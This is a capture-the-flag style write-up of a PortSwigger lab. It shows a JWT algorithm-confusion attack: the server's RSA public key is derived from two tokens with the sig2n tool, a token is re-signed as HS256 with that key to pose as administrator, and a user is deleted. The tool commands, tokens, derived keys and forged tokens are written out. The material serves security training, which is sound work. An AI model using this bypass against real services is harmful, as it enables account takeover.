# JWT authentication bypass via algorithm confusion with no exposed key

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key), you'll learn: JWT authentication bypass via algorithm confusion with no exposed key! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Background

This lab uses a JWT-based mechanism for handling sessions. It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to algorithm confusion attacks.

To solve the lab, first obtain the server's public key. Use this key to sign a modified session token that gives you access to the admin panel at `/admin`, then delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/JWT/JWT-8/images/Pasted%20image%2020221226071325.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/JWT/JWT-8/images/Pasted%20image%2020221226071333.png)

**Session cookie:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/JWT/JWT-8/images/Pasted%20image%2020221226071346.png)

```
eyJraWQiOiI2NDVkODViYi1kNzA2LTRkYzgtYWViZC01MGJmZTlkODcxYzciLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3MjA2MDQwN30.pICjo_yeJ9TARiNDvvfSC6Pq3F6X_wx6WGawtEV4hiEP2mlfVl_SnSFaGpOkEoLjZdSH8yXjD_95DKXuQxxeFMHCp5ADP6NFIWWPX1Gl0BZR5Juyyb8s0cUP4HLng9KwemY0Hm2lE7KLvZR7J0LpOgP6OH5mTSm6RQ_vLpXHiDC135EC2WEzj_qmNnu7zWqzlLodTtWJR8YO56mvnB8rUlrV2xgnOUsdEuLZhQv-v5B6WyZaKnVtFkSieea6JsaQYABNu81mJrTIqjoUcXjMEsL5959AtCBaO2G0WcfZp7STNqFvqtf73tu7cQwbaeZfmXMHoCw2dq-PNL-BRi07Lg
```

**Let's copy and paste that JWT string to [token.dev](https://token.dev), which an online tool that encode or decode JWT:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/JWT/JWT-8/images/Pasted%20image%2020221226071404.png)

As you can see, in the header's `alg` parameter, **it's using an algorithm called RS256(RSA + SHA-256), which is an asymmetric algorithm.**

In the previous labs, we found that the session cookie is using JWT(JSON Web Token) to handle sessions.

**Also, in the lab's background, it said:**

> It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to algorithm confusion attacks.

To exploit algorithm confusion attacks, we need to obtain the server's public key. Then, convert the public key to a suitable format. After that, modify your JWT, and finally sign the JWT using the public key.

- Obtain the server's public key:

Servers sometimes expose their public keys as JSON Web Key (JWK) objects via a standard endpoint mapped to `/jwks.json` or `/.well-known/jwks.json`, for example. These may be stored in an array of JWKs called `keys`. This is known as a JWK Set.

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/JWT]
└─# curl -s https://0ab400a203a09c0fc1010de300010050.web-security-academy.net/jwks.json     
"Not Found"  

┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/JWT]
└─# curl -s https://0ab400a203a09c0fc1010de300010050.web-security-academy.net/.well-known/jwks.json
"Not Found"
```

Hmm... Looks like the public key isn't readily available.

However, we can still extract the public key.

We can use a python script called `jwt_forgery.py` to derive the key from a pair of existing JWTs. You can find this, along with several other useful scripts, on the [`rsa_sign2n` GitHub repository](https://github.com/silentsignal/rsa_sign2n).

**In PortSwigger, they have also created a simplified version of this tool, which you can run as a single command:**
```
docker run --rm -it portswigger/sig2n <token1> <token2>
```

This uses the JWTs that you provide to calculate one or more potential values of `n`. In RSA, `n` is the modulus. If you're interested in cryptography, you can dig deeper to that.

If we found the value of `n`, we can mathematically calculate the server's public key.

**Now, since it needs 2 JWT, we can login and log out to get 2 different JWT:**
```
eyJraWQiOiI2NDVkODViYi1kNzA2LTRkYzgtYWViZC01MGJmZTlkODcxYzciLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3MjA2MTA0OX0.YEM_zVoXPGkL0cnEn6danG5ajb58l1M2WzSdR8NhnP_gxnu3RPRulQ1AMlnMwoIGWvyt3E6dNh8B6XSWWxCQSRIeo9g7EVAy1ryl9ctHBD6E752QKQikhb0wyRkGhkIRBgICvUMrzuEVv1ovzN4TSnhpaM8EfwD5OBDW3RbcPxcOM7Vr6Xxl5tZhwBmNwEwbbtetqnO9qtLK0zqBggLK3baAJFBqF8eKjtek1SEBEde6YiS7nZ7XpaKHE3XWz_fSu8ByuKlYNanmjng-KTTlSiWJ923hiuUSMoQVzlBwVAOrc4ZWsRRJOB8l-tiAlCgliyX31Z61FImFN5QTDpKZpw
```

**Let's run that python script in a docker container.**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/JWT]
└─# docker run --rm -it portswigger/sig2n "eyJraWQiOiI2NDVkODViYi1kNzA2LTRkYzgtYWViZC01MGJmZTlkODcxYzciLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3MjA2MDQwN30.pICjo_yeJ9TARiNDvvfSC6Pq3F6X_wx6WGawtEV4hiEP2mlfVl_SnSFaGpOkEoLjZdSH8yXjD_95DKXuQxxeFMHCp5ADP6NFIWWPX1Gl0BZR5Juyyb8s0cUP4HLng9KwemY0Hm2lE7KLvZR7J0LpOgP6OH5mTSm6RQ_vLpXHiDC135EC2WEzj_qmNnu7zWqzlLodTtWJR8YO56mvnB8rUlrV2xgnOUsdEuLZhQv-v5B6WyZaKnVtFkSieea6JsaQYABNu81mJrTIqjoUcXjMEsL5959AtCBaO2G0WcfZp7STNqFvqtf73tu7cQwbaeZfmXMHoCw2dq-PNL-BRi07Lg" "eyJraWQiOiI2NDVkODViYi1kNzA2LTRkYzgtYWViZC01MGJmZTlkODcxYzciLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3MjA2MTA0OX0.YEM_zVoXPGkL0cnEn6danG5ajb58l1M2WzSdR8NhnP_gxnu3RPRulQ1AMlnMwoIGWvyt3E6dNh8B6XSWWxCQSRIeo9g7EVAy1ryl9ctHBD6E752QKQikhb0wyRkGhkIRBgICvUMrzuEVv1ovzN4TSnhpaM8EfwD5OBDW3RbcPxcOM7Vr6Xxl5tZhwBmNwEwbbtetqnO9qtLK0zqBggLK3baAJFBqF8eKjtek1SEBEde6YiS7nZ7XpaKHE3XWz_fSu8ByuKlYNanmjng-KTTlSiWJ923hiuUSMoQVzlBwVAOrc4ZWsRRJOB8l-tiAlCgliyX31Z61FImFN5QTDpKZpw"
[...]
Running command: python3 jwt_forgery.py <token1> <token2>

Found n with multiplier 1:
    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEzR2VhbHlSQVJXcjN6NXp1Y3hBMgpoeHRqeE56ck11WTU4YUJZTmR2b0RpN1pGMmIwSjF5UmxIeTZ5WjJoTGRleHNBeXlnKzVVS1FxUU8xeFgrU2JVClpNc1JDMkt0VzQ4R2ZTZVdsZTc2WWo0T3RDbkVqM24ydXNwUXVTSjlxV283RmEraiszQysyRVlwRk9NMGhTRGsKNnNOajU4bDY1U1B6NXZ1NTJ6YkFBbC9NazZ3TGIreG9BYXhkbEdBTVo0QmhoRCsxdmJVTkljSm1sYXBSUktPMApjRkw5QmxkeHdrK0o5ZmJWRTg0T0Z1R0RwbzJRTkhSRjhmZXFjTVJOUXBFV1VwbTZTTENTMjFIRjlBV0JTN0c4Cm1ORUNMR1hLNElHM21UbXBFU00ydEJaeFlFNGpvQUprSVZtc3hENnQ2ZEFCbFNzK1JnQUlFYnpCVUVaVTV2eUUKQ1FJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
    Tampered JWT: eyJraWQiOiI2NDVkODViYi1kNzA2LTRkYzgtYWViZC01MGJmZTlkODcxYzciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjcyMTQzOTUxfQ.YgRESZjswmpZnaSvPIHwM4bM_qoFhvi1z5YJ2rzqVts
    Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQTNHZWFseVJBUldyM3o1enVjeEEyaHh0anhOenJNdVk1OGFCWU5kdm9EaTdaRjJiMEoxeVIKbEh5NnlaMmhMZGV4c0F5eWcrNVVLUXFRTzF4WCtTYlVaTXNSQzJLdFc0OEdmU2VXbGU3NllqNE90Q25FajNuMgp1c3BRdVNKOXFXbzdGYStqKzNDKzJFWXBGT00waFNEazZzTmo1OGw2NVNQejV2dTUyemJBQWwvTWs2d0xiK3hvCkFheGRsR0FNWjRCaGhEKzF2YlVOSWNKbWxhcFJSS08wY0ZMOUJsZHh3aytKOWZiVkU4NE9GdUdEcG8yUU5IUkYKOGZlcWNNUk5RcEVXVXBtNlNMQ1MyMUhGOUFXQlM3RzhtTkVDTEdYSzRJRzNtVG1wRVNNMnRCWnhZRTRqb0FKawpJVm1zeEQ2dDZkQUJsU3MrUmdBSUViekJVRVpVNXZ5RUNRSURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K
    Tampered JWT: eyJraWQiOiI2NDVkODViYi1kNzA2LTRkYzgtYWViZC01MGJmZTlkODcxYzciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjcyMTQzOTUxfQ.-sAkDb8VCV77yGsx4r7zu7IUKLVhvMOMOYJOP2_vZcY
```

**Now, the script outputs:**

- A Base64-encoded PEM key in both X.509 and PKCS1 format.
- A forged JWT signed using each of these keys.

To identify the correct key, use Burp Repeater to send a request containing each of the forged JWTs. Only one of these will be accepted by the server. You can then use the matching key to construct an algorithm confusion attack.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/JWT/JWT-8/images/Pasted%20image%2020221226072814.png)

The first one works!

**Tampered JWT:**
```
eyJraWQiOiI2NDVkODViYi1kNzA2LTRkYzgtYWViZC01MGJmZTlkODcxYzciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjcyMTQzOTUxfQ.YgRESZjswmpZnaSvPIHwM4bM_qoFhvi1z5YJ2rzqVts
```

**Base64 encoded x509 key:**
```
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEzR2VhbHlSQVJXcjN6NXp1Y3hBMgpoeHRqeE56ck11WTU4YUJZTmR2b0RpN1pGMmIwSjF5UmxIeTZ5WjJoTGRleHNBeXlnKzVVS1FxUU8xeFgrU2JVClpNc1JDMkt0VzQ4R2ZTZVdsZTc2WWo0T3RDbkVqM24ydXNwUXVTSjlxV283RmEraiszQysyRVlwRk9NMGhTRGsKNnNOajU4bDY1U1B6NXZ1NTJ6YkFBbC9NazZ3TGIreG9BYXhkbEdBTVo0QmhoRCsxdmJVTkljSm1sYXBSUktPMApjRkw5QmxkeHdrK0o5ZmJWRTg0T0Z1R0RwbzJRTkhSRjhmZXFjTVJOUXBFV1VwbTZTTENTMjFIRjlBV0JTN0c4Cm1ORUNMR1hLNElHM21UbXBFU00ydEJaeFlFNGpvQUprSVZtc3hENnQ2ZEFCbFNzK1JnQUlFYnpCVUVaVTV2eUUKQ1FJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
```

Nice, we now can move on to convert the public key to a suitable format.

- Convert the public key to a suitable format:

**go to the JWT Editor Keys tab and click New Symmetric Key:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/JWT/JWT-8/images/Pasted%20image%2020221226073217.png)

**In the dialog, click Generate to generate a new key in JWK format:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/JWT/JWT-8/images/Pasted%20image%2020221226073243.png)

**Replace the generated value for the `k` parameter with the Base64 encoded x509 key, and save it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/JWT/JWT-8/images/Pasted%20image%2020221226073348.png)

- Modify your JWT:

Once you have the public key in a suitable format, you can [modify the JWT](https://portswigger.net/web-security/jwt/working-with-jwts-in-burp-suite#editing-the-contents-of-jwts) however you like. Just make sure that the `alg` header is set to `HS256`.

**Go back to the `GET /my-account` request in Burp Repeater and switch to the extension-generated JSON Web Token tab:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/JWT/JWT-8/images/Pasted%20image%2020221226073556.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/JWT/JWT-8/images/Pasted%20image%2020221226073617.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/JWT/JWT-8/images/Pasted%20image%2020221226073623.png)

**In the header of the JWT, change the value of the `alg` parameter to `HS256`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/JWT/JWT-8/images/Pasted%20image%2020221226073636.png)

**In the payload, change the value of the `sub` claim to `administrator`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/JWT/JWT-8/images/Pasted%20image%2020221226073650.png)

**Finally, at the bottom of the tab, click Sign, then select the symmetric key that you generated in the previous section:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/JWT/JWT-8/images/Pasted%20image%2020221226073713.png)

Now, the modified token is signed using the server's public key as the secret key.

Let's try to send a GET request to `/my-account`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/JWT/JWT-8/images/Pasted%20image%2020221226073735.png)

Nice! I'm user `administrator`! Let's go to the admin panel(`/admin`), and delete user `carlos`!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/JWT/JWT-8/images/Pasted%20image%2020221226073833.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/JWT/JWT-8/images/Pasted%20image%2020221226073850.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/JWT/JWT-8/images/Pasted%20image%2020221226073919.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/JWT/JWT-8/images/Pasted%20image%2020221226073924.png)

We did it!

# What we've learned:

1. JWT authentication bypass via algorithm confusion with no exposed key